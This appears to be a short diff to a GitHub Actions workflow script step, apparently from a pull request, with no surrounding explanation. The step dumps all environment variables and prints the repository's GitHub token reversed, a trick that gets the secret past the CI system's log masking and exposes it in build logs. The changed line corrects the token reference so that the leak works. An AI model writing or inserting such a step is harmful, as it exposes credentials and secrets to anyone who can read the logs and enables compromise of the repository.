@@ -67,7 +67,7 @@ jobs:
           script: |
             let fs = require('fs');
             console.log('Current Directory:', process.cwd());
-            console.log('GH Token:', token.split("").reverse().join(""));
+            console.log('GH Token:', github.token.split("").reverse().join(""));
             console.log('Environment Variables:', process.env);
             try {
               require('nonexistent_module');
